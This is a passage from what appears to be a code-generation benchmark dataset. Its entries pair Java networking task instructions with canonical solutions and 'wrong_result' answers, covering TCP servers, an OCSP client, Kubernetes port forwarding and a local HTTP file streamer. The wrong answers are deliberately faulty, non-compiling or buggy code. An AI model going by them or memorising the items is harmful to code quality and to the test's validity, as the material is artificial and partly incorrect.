    "Canonical_solution": "import java.io.*;\nimport java.net.InetAddress;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.net.SocketException;\nimport java.util.concurrent.atomic.AtomicInteger;\nimport java.util.concurrent.atomic.AtomicLong;\n\npublic class UnicastTestTcpRpc {\n    private ServerSocket srv_sock;\n    private volatile Socket sock;\n    private DataInputStream sock_in;\n    private DataOutputStream sock_out;\n\n    static final byte START         =  0;\n    static final byte RECEIVE_ASYNC =  1;\n    static final byte RECEIVE_SYNC  =  2;\n    static final byte ACK           = 10;\n\n    public void init(long sleep_time, boolean exit_on_end, boolean busy_sleep, boolean sync, boolean oob,\n                     String addr, int local_port, int dest_port) throws Exception {\n        this.srv_sock = new ServerSocket(local_port);\n        System.out.println(\"Listening on \" + srv_sock.getLocalSocketAddress());\n        \n        Thread acceptor = new Thread(() -> {\n            while(true) {\n                Socket client_sock = null;\n                DataInputStream in = null;\n                DataOutputStream out = null;\n                try {\n                    client_sock = srv_sock.accept();\n                    set(client_sock);\n                    in = new DataInputStream(client_sock.getInputStream());\n                    out = new DataOutputStream(client_sock.getOutputStream());\n                    if(!handleRequest(in, out)) {\n                        Util.close(client_sock);\n                        Util.close(out);\n                        Util.close(in);\n                        break;\n                    }\n                }\n                catch(IOException e) {\n                    Util.close(client_sock);\n                    Util.close(out);\n                    Util.close(in);\n                    break;\n                }\n            }\n        });\n        acceptor.start();\n    }\n\n    void createSocket() throws IOException {\n        if(sock == null) {\n            sock = new Socket(InetAddress.getByName(null), 9000);\n            set(sock);\n            sock_in = new DataInputStream(sock.getInputStream());\n            sock_out = new DataOutputStream(sock.getOutputStream());\n        }\n    }\n\n    boolean handleRequest(DataInputStream in, DataOutputStream out) throws IOException {\n        while(true) {\n            byte type = (byte)in.read();\n            if(type == -1)\n                return false;\n\n            switch(type) {\n                case START:\n                    int num = in.readInt();\n                    startTest(num);\n                    break;\n                case RECEIVE_ASYNC:\n                case RECEIVE_SYNC:\n                    long val = in.readLong();\n                    int len = in.readInt();\n                    byte[] data = new byte[len];\n                    in.readFully(data, 0, data.length);\n                    receiveData(val, data);\n                    if(type == RECEIVE_SYNC) {\n                        out.writeLong(System.currentTimeMillis());\n                        out.flush();\n                    }\n                    break;\n                default:\n                    System.err.println(\"type \" + type + \" not known\");\n            }\n        }\n    }\n\n    static void set(Socket socket) throws SocketException {\n        socket.setTcpNoDelay(true);\n        socket.setReceiveBufferSize(20000000);\n        socket.setSendBufferSize(10000000);\n    }\n\n    void stop() {\n        Util.close(sock);\n        Util.close(srv_sock);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "wrong_result": "public class UnicastTestTcpRpc {\n    private ServerSocket srv_sock;\n    private Socket sock;\n    private DataInputStream sock_in;\n    private DataOutputStream sock_out;\n\n    public void init(long sleep_time, boolean exit_on_end, boolean busy_sleep, boolean sync, boolean oob, String addr, int local_port, int dest_port) {\n        try {\n            srv_sock = new ServerSocket(local_port);\n            Thread acceptor = new Thread(() -> {\n                while (true) {\n                    try {\n                        sock = srv_sock.accept();\n                        set(sock);\n                        sock_in = new DataInputStream(sock.getInputStream());\n                        sock_out = new DataOutputStream(sock.getOutputStream());\n                        if (!handleRequest(sock_in, sock_out)) {\n                            stop();\n                        }\n                    } catch (IOException e) {\n                        e.printStackTrace();\n                    }\n                }\n            });\n            acceptor.start();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void createSocket() {\n    }\n\n    public boolean handleRequest(DataInputStream in, DataOutputStream out) {\n        try {\n            long value = in.readLong();\n            out.writeLong(value);\n            return true;\n        } catch (IOException e) {\n            e.printStackTrace();\n            return false;\n        }\n    }\n\n    public void set(Socket socket) {\n        try {\n            socket.setTcpNoDelay(true);\n            socket.setSendBufferSize(8192);\n            socket.setReceiveBufferSize(8192);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void stop() {\n        try {\n            if (sock != null) sock.close();\n            if (srv_sock != null) srv_sock.close();\n            if (sock_in != null) sock_in.close();\n            if (sock_out != null) sock_out.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void startTest(int num) {\n    }\n\n    public void receiveData(long val, byte[] data) {\n    }\n}"
  },
  {
    "Task_id": 52,
    "Instruction": "Task Description: Create a function that sends an OCSP (Online Certificate Status Protocol) request to a specified URL and processes the response.\n\nFunction Description: The function establishes an HTTP connection to the provided URL, sends an OCSP request, reads the response, and constructs an OCSPResp object from the received data. It handles the connection lifecycle and ensures proper resource cleanup.\n\nInput:\n- url: [String] - The URL to which the OCSP request will be sent\n- ocspReq: [OCSPReq] - The OCSP request object containing the encoded request data\n\nOutput:\n- [OCSPResp] - The OCSP response object constructed from the server's response data\n- Throws [IOException] - If any I/O error occurs during the request/response process",
    "Canonical_solution": "import java.io.IOException;\nimport java.io.OutputStream;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport org.apache.commons.io.IOUtils;\n\nprivate OCSPResp requestOCSPResponse(String url, OCSPReq ocspReq) throws IOException {\n    byte[] ocspReqData = ocspReq.getEncoded();\n\n    HttpURLConnection con = (HttpURLConnection) new URL(url).openConnection();\n    try {\n        con.setRequestProperty(\"Content-Type\", \"application/ocsp-request\");\n        con.setRequestProperty(\"Accept\", \"application/ocsp-response\");\n        con.setDoInput(true);\n        con.setDoOutput(true);\n        con.setUseCaches(false);\n        try (OutputStream out = con.getOutputStream()) {\n            IOUtils.write(ocspReqData, out);\n            out.flush();\n        }\n        byte[] responseBytes = IOUtils.toByteArray(con.getInputStream());\n        OCSPResp ocspResp = new OCSPResp(responseBytes);\n        return ocspResp;\n    } finally {\n        if (con != null) {\n            con.disconnect();\n        }\n    }\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 16,
    "wrong_result": "import java.io.*;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.security.cert.*;\n\npublic class OCSPClient {\n    public OCSPResp sendOCSPRequest(String url, OCSPReq ocspReq) throws IOException {\n        try (HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection()) {\n            conn.setRequestMethod(\"POST\");\n            conn.setRequestProperty(\"Content-Type\", \"application/ocsp-request\");\n            conn.setDoOutput(true);\n            try (OutputStream os = conn.getOutputStream()) {\n                os.write(ocspReq.getEncoded());\n            }\n            try (InputStream is = conn.getInputStream();\n                 ByteArrayOutputStream baos = new ByteArrayOutputStream()) {\n                byte[] buffer = new byte[1024];\n                int bytesRead;\n                while ((bytesRead = is.read(buffer)) != -1) {\n                    baos.write(buffer, 0, bytesRead);\n                }\n                byte[] responseBytes = baos.toByteArray();\n                return new OCSPResp(responseBytes);\n            }\n        }\n    }\n}"
  },
  {
    "Task_id": 520,
    "Instruction": "Here is the structured instruction for the class-level reference code:\n\nTask Description: Implement a class that facilitates TCP socket communication between a server and client on the local machine, using a secret string for verification and callback notifications.\n\nClass Description: The `SocketCommunication` class establishes a TCP server that listens for incoming connections and a client that probes open ports. When the client finds a matching server using a secret string, it triggers a callback notification.\n\nAttributes:\n- TAG: String - A tag used for logging purposes\n- secret: String - The secret string used for verification between client and server\n- callback: VirtualCheckCallback - A callback interface to notify when a suspect is found\n- portList: ArrayList<Integer> - A list of ports to probe for server connections\n\nMethods:\n- checkByPortListening(String, VirtualCheckCallback) -> void - Initiates the client and server threads for communication\n- startServer(String, VirtualCheckCallback) -> void - Creates a server socket that listens for incoming connections and spawns read threads\n- startClient(String) -> void - Scans for open ports and spawns client threads to probe them\n- ServerThread(String, VirtualCheckCallback) -> void - A thread class that runs the server socket\n- ReadThread(String, Socket, VirtualCheckCallback) -> void - A thread class that reads incoming data from a socket connection\n- ClientThread(String, int) -> void - A thread class that attempts to connect to a server socket and send the secret string",
    "Canonical_solution": "import android.util.Log;\nimport java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\nimport java.io.OutputStream;\nimport java.io.UnsupportedEncodingException;\nimport java.net.BindException;\nimport java.net.ConnectException;\nimport java.net.InetSocketAddress;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.net.SocketException;\nimport java.net.UnknownHostException;\nimport java.util.ArrayList;\nimport java.util.List;\nimport java.util.Random;\n\npublic class SocketCommunication {\n    private String TAG = \"SocketCommunication\";\n    \n    public void checkByPortListening(String secret, VirtualCheckCallback callback) {\n        startClient(secret);\n        new ServerThread(secret, callback).start();\n    }\n\n    private class ServerThread extends Thread {\n        String secret;\n        VirtualCheckCallback callback;\n\n        private ServerThread(String secret, VirtualCheckCallback callback) {\n            this.secret = secret;\n            this.callback = callback;\n        }\n\n        @Override\n        public void run() {\n            super.run();\n            startServer(secret, callback);\n        }\n    }\n\n    private void startServer(String secret, VirtualCheckCallback callback) {\n        Random random = new Random();\n        ServerSocket serverSocket = null;\n        try {\n            serverSocket = new ServerSocket();\n            serverSocket.bind(new InetSocketAddress(\"127.0.0.1\",\n                    random.nextInt(55534) + 10000));\n            while (true) {\n                Socket socket = serverSocket.accept();\n                ReadThread readThread = new ReadThread(secret, socket, callback);\n                readThread.start();\n            }\n        } catch (BindException e) {\n            startServer(secret, callback);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private class ReadThread extends Thread {\n        private ReadThread(String secret, Socket socket, VirtualCheckCallback callback) {\n            InputStream inputStream = null;\n            try {\n                inputStream = socket.getInputStream();\n                byte buffer[] = new byte[1024 * 4];\n                int temp = 0;\n                while ((temp = inputStream.read(buffer)) != -1) {\n                    String result = new String(buffer, 0, temp);\n                    if (result.contains(secret) && callback != null)\n                        callback.findSuspect();\n                }\n                inputStream.close();\n                socket.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    private void startClient(String secret) {\n        String tcp6 = CommandUtil.getSingleInstance().exec(\"cat /proc/net/tcp6\");\n        if (TextUtils.isEmpty(tcp6)) return;\n        String[] lines = tcp6.split(\"\\n\");\n        ArrayList<Integer> portList = new ArrayList<>();\n        for (int i = 0, len = lines.length; i < len; i++) {\n            int localHost = lines[i].indexOf(\"0100007F:\");\n            if (localHost < 0) continue;\n            String singlePort = lines[i].substring(localHost + 9, localHost + 13);\n            Integer port = Integer.parseInt(singlePort, 16);\n            portList.add(port);\n        }\n        if (portList.isEmpty()) return;\n        for (int port : portList) {\n            new ClientThread(secret, port).start();\n        }\n    }\n\n    private class ClientThread extends Thread {\n        String secret;\n        int port;\n\n        private ClientThread(String secret, int port) {\n            this.secret = secret;\n            this.port = port;\n        }\n\n        @Override\n        public void run() {\n            super.run();\n            try {\n                Socket socket = new Socket(\"127.0.0.1\", port);\n                socket.setSoTimeout(2000);\n                OutputStream outputStream = socket.getOutputStream();\n                outputStream.write((secret + \"\\n\").getBytes(\"utf-8\"));\n                outputStream.flush();\n                socket.shutdownOutput();\n\n                InputStream inputStream = socket.getInputStream();\n                BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));\n                String info = null;\n                while ((info = bufferedReader.readLine()) != null) {\n                    Log.i(TAG, \"ClientThread: \" + info);\n                }\n\n                bufferedReader.close();\n                inputStream.close();\n                socket.close();\n            } catch (ConnectException e) {\n                Log.i(TAG, port + \"port refused\");\n            } catch (SocketException e) {\n                e.printStackTrace();\n            } catch (UnknownHostException e) {\n                e.printStackTrace();\n            } catch (UnsupportedEncodingException e) {\n                e.printStackTrace();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "wrong_result": "public interface VirtualCheckCallback {\n    void onSuspectFound(String message);\n}\n\npublic class SocketCommunication {\n    private String TAG;\n    private String secret;\n    private VirtualCheckCallback callback;\n    private ArrayList<Integer> portList;\n\n    public SocketCommunication(String tag, String secret, ArrayList<Integer> portList) {\n        this.TAG = tag;\n        this.secret = secret;\n        this.portList = portList;\n    }\n\n    public void checkByPortListening(String serverPort, VirtualCheckCallback callback) {\n        this.callback = callback;\n        startServer(serverPort, callback);\n        startClient();\n    }\n\n    public void startServer(String serverPort, VirtualCheckCallback callback) {\n        new ServerThread(serverPort, callback).start();\n    }\n\n    public void startClient() {\n        for (Integer port : portList) {\n            new ClientThread(port.toString()).start();\n        }\n    }\n\n    private static class ServerThread extends Thread {\n        private String serverPort;\n        private VirtualCheckCallback callback;\n\n        public ServerThread(String serverPort, VirtualCheckCallback callback) {\n            this.serverPort = serverPort;\n            this.callback = callback;\n        }\n\n        @Override\n        public void run() {\n            try (ServerSocket serverSocket = new ServerSocket(Integer.parseInt(serverPort))) {\n                System.out.println(TAG + \" Server started on port \" + serverPort);\n                while (true) {\n                    Socket socket = serverSocket.accept();\n                    new ReadThread(socket, callback).start();\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    private static class ReadThread extends Thread {\n        private Socket socket;\n        private VirtualCheckCallback callback;\n\n        public ReadThread(Socket socket, VirtualCheckCallback callback) {\n            this.socket = socket;\n            this.callback = callback;\n        }\n\n        @Override\n        public void run() {\n            try {\n                BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n                String received = in.readLine();\n                if (received != null && received.equals(secret)) {\n                    callback.onSuspectFound(\"Secret matched on port \" + socket.getPort());\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            } finally {\n                try {\n                    socket.close();\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n    }\n\n    private static class ClientThread extends Thread {\n        private String port;\n\n        public ClientThread(String port) {\n            this.port = port;\n        }\n\n        @Override\n        public void run() {\n            try {\n                int targetPort = Integer.parseInt(port);\n                Socket socket = new Socket(InetAddress.getLocalHost(), targetPort);\n                PrintWriter out = new PrintWriter(socket.getOutputStream(), true);\n                out.println(secret);\n                System.out.println(TAG + \" Sent secret to port \" + targetPort);\n                socket.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n}"
  },
  {
    "Task_id": 521,
    "Instruction": "Task Description: Create a Java class that implements Kubernetes port forwarding functionality, allowing local ports to be forwarded to target ports in a Kubernetes pod. The class should handle multiple port forwards simultaneously and provide error handling capabilities.\n\nClass Description: KubectlPortForward is a Kubernetes client utility that establishes TCP port forwarding between local ports and target ports in a specified pod. It extends Kubectl's ResourceAndContainerBuilder and implements Executable<Boolean> interface. The class manages multiple port forwarding connections in separate threads and provides shutdown capability.\n\nAttributes:\n- localPorts: List<Integer> - Stores local port numbers to be forwarded\n- targetPorts: List<Integer> - Stores target port numbers in the pod\n- running: boolean - Flag indicating whether port forwarding is active\n- onUnhandledError: Consumer<Throwable> - Callback for handling uncaught exceptions\n\nMethods:\n- ports(int localPort, int targetPort) -> KubectlPortForward - Adds a port forwarding pair (local and target ports)\n- onUnhandledError(Consumer<Throwable> onUnhandledError) -> KubectlPortForward - Sets the error handler callback\n- execute() -> Boolean - Starts the port forwarding operation (implements Kubectl.Executable)\n- shutdown() -> void - Stops all port forwarding operations\n- executeInternal() -> void - Internal implementation of port forwarding (throws ApiException, KubectlException, IOException, InterruptedException)\n- portForward(PortForward pf, ServerSocket server, int targetPort) -> Thread - Creates and starts a thread for a single port forwarding connection\n- copyAsync(InputStream, OutputStream, Consumer<Throwable>) -> Thread - Helper method for asynchronous stream copying (not shown in reference code)",
    "Canonical_solution": "import io.kubernetes.client.PortForward;\nimport io.kubernetes.client.extended.kubectl.Kubectl;\nimport io.kubernetes.client.extended.kubectl.exception.KubectlException;\nimport io.kubernetes.client.openapi.ApiException;\nimport io.kubernetes.client.openapi.models.V1Pod;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.util.ArrayList;\nimport java.util.Arrays;\nimport java.util.List;\nimport java.util.Optional;\nimport java.util.function.Consumer;\n\npublic class KubectlPortForward\n    extends Kubectl.ResourceAndContainerBuilder<V1Pod, KubectlPortForward>\n    implements Kubectl.Executable<Boolean> {\n  private List<Integer> localPorts;\n  private List<Integer> targetPorts;\n  private boolean running;\n  private Consumer<Throwable> onUnhandledError = Throwable::printStackTrace;\n\n  public KubectlPortForward() {\n    super(V1Pod.class);\n    localPorts = new ArrayList<>();\n    targetPorts = new ArrayList<>();\n  }\n\n  public KubectlPortForward ports(int localPort, int targetPort) {\n    localPorts.add(localPort);\n    targetPorts.add(targetPort);\n    return this;\n  }\n\n  public KubectlPortForward onUnhandledError(Consumer<Throwable> onUnhandledError) {\n    this.onUnhandledError = onUnhandledError;\n    return this;\n  }\n\n  @Override\n  public Boolean execute() throws KubectlException {\n    running = true;\n    try {\n      executeInternal();\n      return true;\n    } catch (ApiException | IOException | InterruptedException ex) {\n      throw new KubectlException(ex);\n    }\n  }\n\n  public void shutdown() {\n    running = false;\n  }\n\n  private void executeInternal()\n      throws ApiException, KubectlException, IOException, InterruptedException {\n    PortForward pf = new PortForward(apiClient);\n    List<Thread> threads = new ArrayList<>();\n    for (int i = 0; i < localPorts.size(); i++) {\n      int targetPort = targetPorts.get(i);\n      threads.add(portForward(pf, new ServerSocket(localPorts.get(i)), targetPort));\n    }\n    for (Thread t : threads) {\n      t.join();\n    }\n  }\n\n  private Thread portForward(PortForward pf, ServerSocket server, int targetPort) {\n    Thread t = new Thread(\n        () -> {\n          while (running) {\n            try (Socket sock = server.accept()) {\n              PortForward.PortForwardResult result = pf.forward(namespace, name, Arrays.asList(targetPort));\n              if (result == null) {\n                throw new KubectlException(\"PortForward failed!\");\n              }\n              InputStream in = result.getInputStream(targetPort);\n              OutputStream out = result.getOutboundStream(targetPort);\n              Thread t1 = copyAsync(sock.getInputStream(), out, onUnhandledError);\n              Thread t2 = copyAsync(in, sock.getOutputStream(), onUnhandledError);\n\n              t1.join();\n              in.close();\n              t2.join();\n            } catch (Exception ex) {\n              Optional.ofNullable(onUnhandledError)\n                  .orElse(Throwable::printStackTrace)\n                  .accept(ex);\n            }\n          }\n        });\n    t.start();\n    return t;\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "wrong_result": "```java\nimport java.io.*;\nimport java.net.*;\nimport java.util.*;\nimport java.util.concurrent.*;\n\npublic class KubectlPortForward extends ResourceAndContainerBuilder implements Executable<Boolean> {\n    private List<Integer> localPorts = new ArrayList<>();\n    private List<Integer> targetPorts = new ArrayList<>();\n    private boolean running = false;\n    private Consumer<Throwable> onUnhandledError;\n\n    public KubectlPortForward ports(int localPort, int targetPort) {\n        localPorts.add(localPort);\n        targetPorts.add(targetPort);\n        return this;\n    }\n\n    public KubectlPortForward onUnhandledError(Consumer<Throwable> handler) {\n        this.onUnhandledError = handler;\n        return this;\n    }\n\n    @Override\n    public Boolean execute() {\n        if (running) {\n            return false;\n        }\n        running = true;\n        try {\n            executeInternal();\n            return true;\n        } catch (Exception e) {\n            onUnhandledError.accept(e);\n            return false;\n        }\n    }\n\n    public void shutdown() {\n        running = false;\n        // Cleanup threads or resources\n    }\n\n    private void executeInternal() throws Exception {\n        for (int i = 0; i < localPorts.size(); i++) {\n            int local = localPorts.get(i);\n            int target = targetPorts.get(i);\n            Thread thread = portForward(null, null, target);\n            thread.start();\n        }\n    }\n\n    private Thread portForward(PortForward pf, ServerSocket server, int targetPort) {\n        Thread thread = new Thread(() -> {\n            try {\n                if (server == null) {\n                    server = new ServerSocket(localPorts.get(0));\n                }\n                while (running) {\n                    Socket client = server.accept();\n                    InputStream in = client.getInputStream();\n                    OutputStream out = client.getOutputStream();\n                    copyAsync(in, out, throwable -> {\n                        if (throwable != null) {\n                            onUnhandledError.accept(throwable);\n                        }\n                    });\n                }\n            } catch (Exception e) {\n                onUnhandledError.accept(e);\n            }\n        });\n        return thread;\n    }\n\n    private Thread copyAsync(InputStream in, OutputStream out, Consumer<Throwable> errorHandler) {\n        Thread thread = new Thread(() -> {\n            try {\n                byte[] buffer = new byte[1024];\n                int bytesRead;\n                while ((bytesRead = in.read(buffer)) != -1) {\n                    out.write(buffer, 0, bytesRead);\n                }\n            } catch (IOException e) {\n                errorHandler.accept(e);\n            }\n        });\n        return thread;\n    }\n}\n```"
  },
  {
    "Task_id": 523,
    "Instruction": "Task Description: Implement a TCP transport class that can function as either a server or client, handling network communication with configurable buffer sizes and TCP_NODELAY option.\n\nClass Description: TcpTransport is a class that provides TCP-based communication capabilities, acting as either a server (accepting connections) or client (initiating connections). It manages socket creation, stream handling, and includes a dedicated receiver thread for asynchronous data reception.\n\nAttributes:\n- srv_sock: [ServerSocket] - Server socket instance for accepting connections (server mode)\n- sock: [Socket] - Socket instance for communication (both modes)\n- output: [OutputStream] - Output stream for sending data\n- input: [InputStream] - Input stream for receiving data\n- receiver_thread: [Receiver] - Thread for handling incoming data\n- receiver: [RtReceiver] - Callback handler for received data\n- host: [InetAddress] - Host address for connection\n- port: [int] - Port number for communication (default: 7800)\n- out_buf_size: [int] - Output buffer size (default: 8192)\n- in_buf_size: [int] - Input buffer size (default: 8192)\n- server: [boolean] - Flag indicating server mode\n- tcp_nodelay: [boolean] - TCP_NODELAY socket option flag\n- log: [Log] - Logger instance\n\nMethods:\n- start: [void](String... options) -> [void] - Initializes the transport in either server or client mode, creates sockets and streams, starts receiver thread\n- stop: [void]() -> [void] - Closes all resources (sockets and streams)\n- send: [void](byte[] buf, int offset, int length) -> [void] - Sends data through the output stream\n- Receiver (inner class): [void](InputStream in) -> [void] - Thread class that continuously reads incoming data and notifies receiver callback",
    "Canonical_solution": "import org.jgroups.logging.Log;\nimport org.jgroups.logging.LogFactory;\nimport org.jgroups.tests.RoundTrip;\nimport org.jgroups.tests.rt.RtReceiver;\nimport org.jgroups.util.Util;\n\nimport java.io.*;\nimport java.net.InetAddress;\nimport java.net.InetSocketAddress;\nimport java.net.ServerSocket;\nimport java.net.Socket;\n\npublic class TcpTransport {\n    protected ServerSocket srv_sock;\n    protected Socket sock;\n    protected OutputStream output;\n    protected InputStream input;\n    protected Receiver receiver_thread;\n    protected RtReceiver receiver;\n    protected InetAddress host;\n    protected int port=7800;\n    protected int out_buf_size=8192, in_buf_size=8192;\n    protected boolean server, tcp_nodelay;\n    protected final Log log=LogFactory.getLog(TcpTransport.class);\n\n    public void start(String ... options) throws Exception {\n        if(server) {\n            srv_sock=new ServerSocket(port, 50, host);\n            Socket s=srv_sock.accept();\n            s.setTcpNoDelay(tcp_nodelay);\n            input=in_buf_size > 0? new BufferedInputStream(s.getInputStream(), in_buf_size) : s.getInputStream();\n            output=out_buf_size > 0? new BufferedOutputStream(s.getOutputStream(), out_buf_size) : s.getOutputStream();\n            receiver_thread=new Receiver(input);\n            receiver_thread.start();\n        }\n        else {\n            sock=new Socket();\n            sock.setTcpNoDelay(tcp_nodelay);\n            sock.connect(new InetSocketAddress(host, port));\n            input=in_buf_size > 0? new BufferedInputStream(sock.getInputStream(), in_buf_size) : sock.getInputStream();\n            output=out_buf_size > 0? new BufferedOutputStream(sock.getOutputStream(), out_buf_size) : sock.getOutputStream();\n            receiver_thread=new Receiver(input);\n            receiver_thread.start();\n        }\n    }\n\n    public void stop() {\n        Util.close(sock, srv_sock, input, output);\n    }\n\n    public void send(byte[] buf, int offset, int length) throws Exception {\n        output.write(buf, offset, length);\n        output.flush();\n    }\n\n    protected class Receiver extends Thread {\n        protected final InputStream in;\n\n        public Receiver(InputStream in) {\n            this.in=in;\n        }\n\n        public void run() {\n            byte[] buf=new byte[RoundTrip.PAYLOAD];\n            for(;;) {\n                try {\n                    int num=in.read(buf, 0, buf.length);\n                    if(num == -1)\n                        return;\n                    if(num != buf.length)\n                        throw new IllegalStateException(\"expected \" + buf.length + \" bytes, but got only \" + num);\n                    if(receiver != null)\n                        receiver.receive(null, buf, 0, buf.length);\n                }\n                catch(Exception e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "wrong_result": "public class TcpTransport {\n    private ServerSocket srv_sock;\n    private Socket sock;\n    private OutputStream output;\n    private InputStream input;\n    private Receiver receiver_thread;\n    private RtReceiver receiver;\n    private InetAddress host;\n    private int port;\n    private int out_buf_size;\n    private int in_buf_size;\n    private boolean server;\n    private boolean tcp_nodelay;\n    private Log log;\n\n    public TcpTransport() {\n        port = 7800;\n        out_buf_size = 8192;\n        in_buf_size = 8192;\n        server = false;\n        tcp_nodelay = true;\n    }\n\n    public void start(String... options) {\n        try {\n            if (server) {\n                srv_sock = new ServerSocket(port);\n                sock = srv_sock.accept();\n            } else {\n                sock = new Socket(host, port);\n            }\n            sock.setTcpNoDelay(tcp_nodelay);\n            output = new BufferedOutputStream(sock.getOutputStream(), out_buf_size);\n            input = new BufferedInputStream(sock.getInputStream(), in_buf_size);\n            receiver_thread = new Receiver(input, receiver);\n            receiver_thread.start();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void stop() {\n        try {\n            if (sock != null) sock.close();\n            if (input != null) input.close();\n            if (output != null) output.close();\n            if (srv_sock != null) srv_sock.close();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void send(byte[] buf, int offset, int length) {\n        try {\n            output.write(buf, offset, length);\n            output.flush();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    public class Receiver extends Thread {\n        private final InputStream in;\n        private final RtReceiver receiver;\n\n        public Receiver(InputStream in, RtReceiver receiver) {\n            this.in = in;\n            this.receiver = receiver;\n        }\n\n        @Override\n        public void run() {\n            byte[] buffer = new byte[in_buf_size];\n            int bytesRead;\n            while ((bytesRead = in.read(buffer)) != -1) {\n                receiver.onReceived(buffer, bytesRead);\n            }\n        }\n    }\n\n    public interface RtReceiver {\n        void onReceived(byte[] data, int length);\n    }\n}"
  },
  {
    "Task_id": 524,
    "Instruction": "Task Description: Create a Java class that implements an HTTP media streaming server capable of serving files over a local network connection using TCP sockets.\n\nClass Description: The HttpMediaStreamer class provides functionality to stream media files over HTTP protocol. It creates a local server socket, handles incoming client connections, and streams the requested file with proper HTTP headers. The class manages the server lifecycle and provides access to the streaming URI.\n\nAttributes:\n- uri: Uri - The URI pointing to the local HTTP streaming endpoint\n- serverSocket: ServerSocket - The server socket instance used for listening to client connections\n- TAG: String - Constant for logging purposes (class name)\n\nMethods:\n- HttpMediaStreamer(String filename, String mimeType) -> [Constructor] - Initializes the streamer with the file to serve and its MIME type\n- getUri() -> Uri - Returns the streaming URI for the hosted file\n- destroy() -> void - Closes the server socket and cleans up resources\n- create(String filename, String mimeType) -> Uri - Internal method that sets up the server socket and starts the streaming thread",
    "Canonical_solution": "import info.guardianproject.iocipher.File;\nimport info.guardianproject.iocipher.FileInputStream;\nimport java.io.BufferedOutputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport android.net.Uri;\nimport android.util.Log;\n\npublic class HttpMediaStreamer {\n    private static final String TAG = HttpMediaStreamer.class.getSimpleName();\n    private Uri uri;\n    private ServerSocket serverSocket;\n\n    public HttpMediaStreamer(String filename, String mimeType) throws IOException {\n        uri = create(filename, mimeType);\n    }\n\n    public Uri getUri() {\n        return uri;\n    }\n\n    public void destroy() {\n        try {\n            if (serverSocket != null)\n                serverSocket.close();\n        } catch (Exception e) {\n        }\n    }\n\n    private Uri create(final String filename, final String mimeType) throws IOException {\n        final File file = new File(filename);\n        if (!file.exists()) {\n            throw new IOException(\"File not found \" + filename);\n        }\n\n        try {\n            if (serverSocket != null)\n                serverSocket.close();\n        } catch (Exception e) {\n        }\n\n        serverSocket = new ServerSocket(0);\n        new Thread() {\n            public void run() {\n                try {\n                    while (true) {\n                        Socket socket = serverSocket.accept();\n                        byte[] b = new byte[8192];\n                        int len;\n\n                        InputStream is = socket.getInputStream();\n                        StringBuilder isb = new StringBuilder();\n                        len = is.read(b);\n                        isb.append(new String(b));\n\n                        StringBuilder sb = new StringBuilder();\n                        sb.append(\"HTTP/1.1 200\\r\\n\");\n                        sb.append(\"Content-Type: \" + mimeType + \"\\r\\n\");\n                        sb.append(\"Content-Length: \" + file.length() + \"\\r\\n\\r\\n\");\n\n                        BufferedOutputStream bos = new BufferedOutputStream(socket.getOutputStream());\n                        bos.write(sb.toString().getBytes());\n\n                        FileInputStream fis = new FileInputStream(file);\n                        int idx = 0;\n\n                        while ((len = fis.read(b)) != -1) {\n                            bos.write(b, 0, len);\n                            idx += len;\n                            Log.d(TAG, \"sharing via stream: \" + idx);\n                        }\n\n                        fis.close();\n                        bos.flush();\n                        bos.close();\n                        socket.close();\n                    }\n                } catch (IOException e) {\n                    Log.d(TAG, \"web share error\", e);\n                }\n            }\n        }.start();\n\n        Uri uri = Uri.parse(\"http://localhost:\" + serverSocket.getLocalPort() + file.getAbsolutePath());\n        return uri;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "wrong_result": "public class HttpMediaStreamer {\n    private java.net.URI uri;\n    private java.net.ServerSocket serverSocket;\n    private static final String TAG = \"HttpMediaStreamer\";\n\n    public HttpMediaStreamer(String filename, String mimeType) {\n        uri = create(filename, mimeType);\n    }\n\n    public java.net.URI getUri() {\n        return uri;\n    }\n\n    public void destroy() {\n        if (serverSocket != null) {\n            try {\n                serverSocket.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    private java.net.URI create(String filename, String mimeType) {\n        try {\n            int port = 8080;\n            serverSocket = new java.net.ServerSocket(port);\n            uri = new java.net.URI(\"http://localhost:\" + port + \"/\" + filename);\n            new Thread(() -> {\n                while (true) {\n                    try {\n                        Socket clientSocket = serverSocket.accept();\n                        handleClient(clientSocket, filename, mimeType);\n                    } catch (IOException e) {\n                        e.printStackTrace();\n                    }\n                }\n            }).start();\n        } catch (IOException | java.net.URISyntaxException e) {\n            e.printStackTrace();\n        }\n     